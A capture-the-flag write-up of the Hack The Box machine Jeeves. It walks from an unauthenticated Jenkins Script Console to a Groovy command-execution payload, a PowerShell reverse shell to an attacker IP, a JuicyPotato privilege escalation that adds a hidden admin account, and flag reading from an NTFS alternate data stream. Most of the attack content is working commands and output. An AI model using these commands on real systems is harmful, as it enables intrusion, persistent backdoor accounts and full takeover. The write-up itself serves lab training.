# **HackTheBox — Jeeves | Full Writeup**

> **Platform:** Hack The Box
>
> **Author:** k41r0s3
>
> **Difficulty:** Medium
>
> **Category:** Web / Windows
>
> **Date:** March 19, 2026

---

## TL;DR

Jeeves is a medium Windows machine where port 80 hosts a convincing but entirely fake "Ask Jeeves" search page designed to mislead. The real attack surface is a Jetty server on port 50000 hosting an unauthenticated Jenkins 2.87 instance at `/askjeeves/`. The Groovy Script Console is publicly accessible and, with a CSRF crumb bypass, arbitrary OS commands can be executed on the server. After landing a reverse shell as `jeeves\kohsuke`, `SeImpersonatePrivilege` is abused via JuicyPotato to impersonate `NT AUTHORITY\SYSTEM`. The root flag is not in the expected location — it is hidden in an NTFS Alternate Data Stream attached to a decoy text file on the Administrator's Desktop.

---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Web Enumeration — Port 80](#2-web-enumeration--port-80)
3. [Web Enumeration — Port 50000](#3-web-enumeration--port-50000)
4. [Foothold — Jenkins Script Console RCE](#4-foothold--jenkins-script-console-rce)
5. [Shell as kohsuke](#5-shell-as-kohsuke)
6. [Privilege Escalation — JuicyPotato](#6-privilege-escalation--juicypotato)
7. [Root Flag — NTFS Alternate Data Stream](#7-root-flag--ntfs-alternate-data-stream)
8. [Attack Chain](#8-attack-chain)
9. [Tools Used](#9-tools-used)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. Enumeration

### Full Port Scan

```bash
nmap -Pn -p- -T4 --min-rate 5000 -sV -sC <TARGET_IP> -oN full_scan.txt
```

> **Thought process:** The initial scan without `-Pn` returned `Host seems down` — the machine blocks ICMP ping probes. Adding `-Pn` forces nmap to scan regardless, treating the host as always up. Essential on HTB boxes that filter ICMP.

**Results:**

| Port | State | Service | Version |
| --- | --- | --- | --- |
| 80/tcp | open | http | Microsoft IIS httpd 10.0 |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 445/tcp | open | microsoft-ds | Windows SMB |
| 50000/tcp | open | http | Jetty 9.4.z-SNAPSHOT |

- **Hostname:** JEEVES
- **OS:** Windows 10 Pro Build 10586
- **SMB signing:** disabled (dangerous, but default)
- **IIS page title:** "Ask Jeeves" — immediately suspicious

> **Thought process:** The box is named Jeeves, port 80 is titled "Ask Jeeves", and there's a Jetty server on 50000. Jetty commonly fronts Jenkins in HTB-style boxes. Port 80 is almost certainly a decoy named after the box itself. The real attack surface is port 50000.

---

### SMB Enumeration

```bash
# Null session
smbclient -L //<TARGET_IP> -N
# NT_STATUS_ACCESS_DENIED

# Guest session
smbclient -L //<TARGET_IP> -U guest%
# NT_STATUS_ACCOUNT_DISABLED

# Vuln scripts
nmap -p 445 --script "smb-vuln-*" <TARGET_IP>
# smb-vuln-ms10-054: false
# smb-vuln-ms10-061: No accounts left to try
```

SMB signing is disabled but anonymous and guest access are fully blocked. No known SMB vulnerabilities detected. Dead end.

---

### RPC Enumeration

```bash
rpcclient -U "" -N <TARGET_IP> -c "enumdomusers"
# Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED
```

RPC null session blocked. No path forward here.

---

## 2. Web Enumeration — Port 80

```bash
curl -s http://<TARGET_IP>/
```

The page is a styled "Ask Jeeves" search form. The form `action` attribute points to `error.html` — it does nothing functional.

```bash
curl -s http://<TARGET_IP>/error.html
# <img src="jeeves.PNG" ...>

curl -s http://<TARGET_IP>/style.css
# Decorative CSS only
```

Nikto found only two missing HTTP security headers. No CGI directories, no vulnerabilities.

> **Key finding:** Port 80 is confirmed as a pure decoy. The entire page is a static dead end. All effort pivots to port 50000.

---

## 3. Web Enumeration — Port 50000

### Initial Paths

```bash
curl -sv http://<TARGET_IP>:50000/jenkins
# 404

curl -sv http://<TARGET_IP>:50000/askjeeves
# 404
```

> **Thought process:** `/jenkins` is the most common Jenkins context path but returned 404. The box name and IIS page title both say "Ask Jeeves" — so `/askjeeves` is the logical guess. Still 404. The key insight: Jetty and Jenkins are strict about trailing slashes. A path without a trailing slash is treated as a completely different resource.

### Discovery — Trailing Slash

```bash
curl -sv http://<TARGET_IP>:50000/askjeeves/
```

**Response: HTTP 200**

```
X-Jenkins: 2.87
X-Hudson: 1.395
Set-Cookie: JSESSIONID.699ad3be=...
```

The Jenkins 2.87 dashboard loads with **no authentication required**.

> **Key finding:** Jenkins is fully accessible without credentials at `/askjeeves/`. The trailing slash was the only difference between a 404 and full unauthenticated access to the dashboard.

### Script Console

```bash
curl -sv http://<TARGET_IP>:50000/askjeeves/script
# HTTP 200 — Groovy Script Console page loaded
```

The Script Console accepts arbitrary Groovy code and executes it server-side. This is unauthenticated remote code execution.

---

## 4. Foothold — Jenkins Script Console RCE

### CSRF Crumb Bypass

Jenkins requires a CSRF token (crumb) with every POST request — even when completely unauthenticated. Without it, every POST returns `403 No valid crumb was included in the request`.

```bash
CRUMB=$(curl -s http://<TARGET_IP>:50000/askjeeves/crumbIssuer/api/json | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(d['crumbRequestField']+':'+d['crumb'])")
echo $CRUMB
# Jenkins-Crumb:<crumb_value>
```

> **Thought process:** The crumb is available from the JSON API with no authentication needed. It must be included as an HTTP header with every POST request. This is standard Jenkins CSRF protection that applies regardless of the authentication state of the instance.

### RCE Verification

```bash
curl -s http://<TARGET_IP>:50000/askjeeves/script \
  -H "$CRUMB" \
  --data-urlencode 'script=println "cmd /c whoami".execute().text'
```

**Result:** `jeeves\kohsuke`

RCE confirmed.

> **Thought process:** The simple Groovy `.execute().text` one-liner confirms command execution. For a reverse shell, the challenge is that PowerShell uses `$variables` heavily — Groovy will resolve `$client`, `$stream`, etc. as Groovy variables before the string ever reaches PowerShell, causing `MissingPropertyException: No such property: client`. The fix is PowerShell's `-enc` flag with a Base64-encoded payload, which is completely opaque to Groovy.

### Reverse Shell

**Terminal 1 — Listener:**
```bash
nc -lvnp 4444
```

**Terminal 2 — Fire payload:**

```bash
CRUMB=$(curl -s http://<TARGET_IP>:50000/askjeeves/crumbIssuer/api/json | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(d['crumbRequestField']+':'+d['crumb'])")

curl -s http://<TARGET_IP>:50000/askjeeves/script \
  -H "$CRUMB" \
  --data-urlencode 'script=def proc = ["cmd.exe", "/c", "powershell -nop -w hidden -enc <BASE64_PAYLOAD>"].execute(); proc.waitFor()'
```

> **Note:** Generate the Base64 PowerShell reverse shell payload connecting to `<YOUR_TUN0_IP>:4444` using:
> ```powershell
> $cmd = '$client=New-Object Net.Sockets.TCPClient("<YOUR_TUN0_IP>",4444);...'
> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
> ```

**Shell received:**
```
connect to [<YOUR_TUN0_IP>] from (UNKNOWN) [<TARGET_IP>] 49676
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins>
```

---

## 5. Shell as kohsuke

### User Flag

```powershell
type C:\Users\kohsuke\Desktop\user.txt
# **[REDACTED]**
```

### Privilege and System Check

```powershell
whoami /all
```

**Key privileges:**

```
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

```powershell
systeminfo
# OS: Microsoft Windows 10 Pro
# Build: 10586
# Architecture: x64
```

> **Thought process:** `SeImpersonatePrivilege` enabled on Windows 10 Build 10586 is a textbook JuicyPotato scenario. This build predates the patches introduced in Windows 10 1809 that broke classic potato attacks. The BITS CLSID (`{4991d34b-80a1-4291-83b6-3328366b9097}`) will work on this build without needing to hunt for alternatives.

### Interesting Files

```powershell
dir C:\Users\kohsuke\Documents
# CEH.kdbx  — KeePass database (2846 bytes, noted for later)

dir C:\Users\Administrator\.jenkins
# Full Jenkins install — jenkins.exe, config.xml, secrets/, jobs/
```

> **Key finding:** Jenkins is installed at `C:\Users\Administrator\.jenkins` — meaning Jenkins runs as the local Administrator account. Escalating to SYSTEM will give direct access to the Administrator's Desktop.

---

## 6. Privilege Escalation — JuicyPotato

### Setup on Kali

```bash
# Download JuicyPotato binary
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O /tmp/JuicyPotato.exe

# Serve from working directory
cd ~/hackthebox/machine/jeeves
cp /tmp/JuicyPotato.exe .
python3 -m http.server 8000
```

### Transfer to Victim

```powershell
mkdir C:\Temp
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<YOUR_TUN0_IP>:8000/JuicyPotato.exe','C:\Temp\jp.exe')"
```

### Execute via Bat File

> **Thought process:** The command must be written to a bat file on Kali and served to the victim rather than typed directly into the shell. Copy-pasting commands from a browser or chat tool silently replaces ASCII hyphens (`-`) with Unicode em dashes (`—`). JuicyPotato exits immediately with `Wrong Argument: -` when it encounters these. Writing to a bat file using a heredoc on Kali produces a clean ASCII file and avoids this entirely.

**Create bat on Kali:**
```bash
cd ~/hackthebox/machine/jeeves
cat > pwn.bat << 'EOF'
C:\Temp\jp.exe -l 1338 -p C:\Windows\System32\cmd.exe -t * -a "/c net user hacker <password> /add && net localgroup administrators hacker /add"
EOF
python3 -m http.server 8000
```

**Download and run on victim:**
```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<YOUR_TUN0_IP>:8000/pwn.bat','C:\Temp\pwn.bat')"
cmd /c C:\Temp\pwn.bat
```

**Output:**
```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1338
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

**Verify:**
```powershell
net user hacker
# Local Group Memberships: *Administrators  *Users
```

`NT AUTHORITY\SYSTEM` token obtained. Local administrator account created successfully.

---

## 7. Root Flag — NTFS Alternate Data Stream

### Desktop Appears Empty

```powershell
dir C:\Users\Administrator\Desktop
# (no output — access denied or empty from kohsuke context)

type C:\Users\Administrator\Desktop\root.txt
# (no output)
```

> **Thought process:** The Desktop looks empty. This is a classic HTB technique — the flag is hidden using NTFS Alternate Data Streams (ADS). ADS allows data to be attached to a file under a hidden stream name. Standard `dir` only shows the primary stream. `dir /r` reveals all streams attached to every file in the directory. Reading an ADS stream requires either `more <` syntax via cmd or `Get-Content -Stream` via PowerShell — and requires sufficient privileges to access the file.

### List ADS Streams via JuicyPotato

```bash
# Kali — bat to list streams and dump hm.txt content
cat > readflag.bat << 'EOF'
C:\Temp\jp.exe -l 1339 -p C:\Windows\System32\cmd.exe -t * -a "/c dir /r C:\Users\Administrator\Desktop > C:\Temp\flag.txt && type C:\Users\Administrator\Desktop\hm.txt >> C:\Temp\flag.txt"
EOF
python3 -m http.server 8000
```

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<YOUR_TUN0_IP>:8000/readflag.bat','C:\Temp\readflag.bat')"
cmd /c C:\Temp\readflag.bat
type C:\Temp\flag.txt
```

**Output:**
```
Directory of C:\Users\Administrator\Desktop

12/24/2017  03:51 AM    36 hm.txt
                        34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM   797 Windows 10 Update Assistant.lnk

The flag is elsewhere.  Look deeper.
```

> **Key finding:** `hm.txt:root.txt:$DATA` is the hidden ADS stream. The visible content of `hm.txt` is a deliberate decoy: `"The flag is elsewhere. Look deeper."` The actual flag is the 34-byte `root.txt` stream.

### Read the Hidden Stream

```bash
# Kali — bat to read the ADS stream
cat > readads.bat << 'EOF'
C:\Temp\jp.exe -l 1340 -p C:\Windows\System32\cmd.exe -t * -a "/c more < C:\Users\Administrator\Desktop\hm.txt:root.txt > C:\Temp\root.txt"
EOF
python3 -m http.server 8000
```

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<YOUR_TUN0_IP>:8000/readads.bat','C:\Temp\readads.bat')"
cmd /c C:\Temp\readads.bat
type C:\Temp\root.txt
# **[REDACTED]**
```

Machine pwned. 🏁

---

## 8. Attack Chain

```
[Recon]
  nmap -Pn -p- → ports 80, 135, 445, 50000
  SMB null/guest sessions → NT_STATUS_ACCESS_DENIED
  RPC null session → NT_STATUS_ACCESS_DENIED
         │
         ▼
[Port 80 — Decoy]
  IIS 10.0, title "Ask Jeeves"
  form action → error.html (dead end)
  Nikto → missing headers only
  → confirmed rabbit hole, dropped entirely
         │
         ▼
[Port 50000 — Jetty / Jenkins Discovery]
  /jenkins → 404
  /askjeeves → 404
  /askjeeves/ (trailing slash) → HTTP 200
  → Jenkins 2.87 Dashboard, NO authentication required
         │
         ▼
[Jenkins Script Console — Unauthenticated RCE]
  GET /askjeeves/script → Groovy Script Console accessible
  CSRF crumb fetched from /askjeeves/crumbIssuer/api/json
  POST with crumb header → println "cmd /c whoami".execute().text
  → jeeves\kohsuke confirmed
         │
         ▼
[Reverse Shell]
  powershell -enc <base64> inside Groovy array exec
  (avoids $ variable interpolation issue in Groovy strings)
  nc -lvnp 4444 → shell received as jeeves\kohsuke
         │
         ▼
[User Flag]
  C:\Users\kohsuke\Desktop\user.txt → **[REDACTED]**
         │
         ▼
[Post-Exploitation Recon]
  whoami /all → SeImpersonatePrivilege: Enabled
  systeminfo → Windows 10 Pro Build 10586 (pre-potato-patch)
  C:\Users\kohsuke\Documents\CEH.kdbx → KeePass DB (noted)
  Jenkins home: C:\Users\Administrator\.jenkins → runs as Administrator
         │
         ▼
[Privilege Escalation — JuicyPotato]
  JuicyPotato.exe downloaded via python3 HTTP server
  Executed via bat file served from Kali (avoids unicode dash corruption)
  CLSID {4991d34b-80a1-4291-83b6-3328366b9097} (BITS — works on Build 10586)
  → NT AUTHORITY\SYSTEM token obtained
  → net user + net localgroup → local admin account created
         │
         ▼
[Root Flag — NTFS Alternate Data Stream]
  dir C:\Users\Administrator\Desktop → appears empty from kohsuke shell
  JuicyPotato bat → dir /r → hm.txt:root.txt:$DATA discovered
  hm.txt visible content: "The flag is elsewhere. Look deeper." (decoy)
  JuicyPotato bat → more < hm.txt:root.txt → actual flag extracted as SYSTEM
         │
         ▼
[Root Flag]
  C:\Users\Administrator\Desktop\hm.txt:root.txt → **[REDACTED]**
```

---

## 9. Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service detection |
| `curl` | Web enumeration, CSRF crumb fetch, Jenkins Script Console interaction |
| `ffuf` | Directory fuzzing on port 50000 |
| `nikto` | Web vulnerability scanning |
| `smbclient` | SMB null and guest session attempts |
| `rpcclient` | RPC null session enumeration |
| `nc (netcat)` | Reverse shell listener |
| `python3 -m http.server` | File transfer HTTP server |
| `JuicyPotato` | SeImpersonatePrivilege → SYSTEM token impersonation |
| `certutil` | File encoding for transfer attempts |

---

## 10. Key Takeaways

**1. Always fuzz with a trailing slash on Jetty and Jenkins**

`/askjeeves` returned 404 but `/askjeeves/` returned a full unauthenticated Jenkins dashboard. Jetty treats paths with and without trailing slashes as completely different resources. Without testing the trailing slash variant, the entire attack surface remains invisible. This applies broadly to Java application servers including Tomcat, Jetty, and WildFly.

**2. Jenkins CSRF crumb is required even without authentication**

The Script Console was publicly accessible with zero credentials — but every POST still returned `403 No valid crumb was included in the request`. The crumb must be fetched fresh from `/crumbIssuer/api/json` and included as an HTTP header before every POST. This is a common stumbling block when scripting Jenkins interactions and applies regardless of the authentication state of the instance.

**3. Groovy's `$` interpolation silently breaks PowerShell payloads**

When embedding a PowerShell reverse shell inside a Groovy string, `$client`, `$stream`, `$bytes` and similar variables are resolved by Groovy before PowerShell ever sees the string — resulting in `MissingPropertyException`. The clean fix is PowerShell's `-enc` flag with a Base64-encoded payload: the encoded string is opaque to Groovy and arrives at PowerShell intact.

**4. Use bat files to avoid unicode dash corruption in copy-paste**

Copy-pasting commands from a browser or chat tool into a terminal silently converts ASCII hyphens (`-`) to Unicode em dashes (`—`). JuicyPotato treats these as unknown characters and exits with `Wrong Argument: -`. Writing the command to a bat file using a heredoc on Kali produces a clean ASCII file that fully bypasses this issue. This is the correct workflow for any tool sensitive to exact character encoding.

**5. `SeImpersonatePrivilege` + old Windows build = JuicyPotato**

`SeImpersonatePrivilege` is commonly granted to service accounts and is the prerequisite for all potato-family attacks. Windows 10 Build 10586 is old enough that JuicyPotato works with the default BITS CLSID. On builds 1809 and later, JuicyPotato is patched — use PrintSpoofer or GodPotato instead. Always check the exact OS build with `systeminfo` before choosing a potato variant.

**6. NTFS Alternate Data Streams hide data from standard `dir` listings**

`dir` shows `hm.txt` as 36 bytes containing a decoy message. `dir /r` reveals the hidden `hm.txt:root.txt:$DATA` stream containing the actual flag. Always run `dir /r` on interesting directories — desktops, home folders, and documents — when hunting for flags or credentials on Windows. PowerShell equivalent: `Get-Item -Path <file> -Stream *`.

**7. Jenkins home directory location reveals the service account context**

The Jenkins process ran from `C:\Users\Administrator\.jenkins`, meaning Jenkins was installed under and runs as the local Administrator account. This confirmed that escalating to SYSTEM would give direct read access to the Administrator's Desktop. Checking where a service stores its working data is a fast way to determine what account it runs as.

---

*k41r0s3 | HackTheBox — Jeeves*
